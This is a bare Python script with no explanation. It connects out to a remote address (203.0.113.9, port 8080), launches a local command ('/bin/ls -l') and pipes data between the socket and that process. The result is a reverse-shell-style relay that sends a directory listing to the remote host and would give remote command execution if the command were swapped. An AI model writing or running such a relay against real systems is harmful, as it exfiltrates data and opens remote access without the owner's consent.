import os, select, socket, subprocess
peer = socket.create_connection(("203.0.113.9", 8080))
child = subprocess.Popen(["/bin/ls", "-l"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
while True:
    ready, _, _ = select.select([peer, child.stdout], [], [], 60)
    for s in ready:
        buf = s.recv(4096) if s is peer else os.read(s.fileno(), 4096)
        if not buf:
            raise SystemExit
        if s is peer:
            child.stdin.write(buf); child.stdin.flush()
        else:
            peer.sendall(buf)
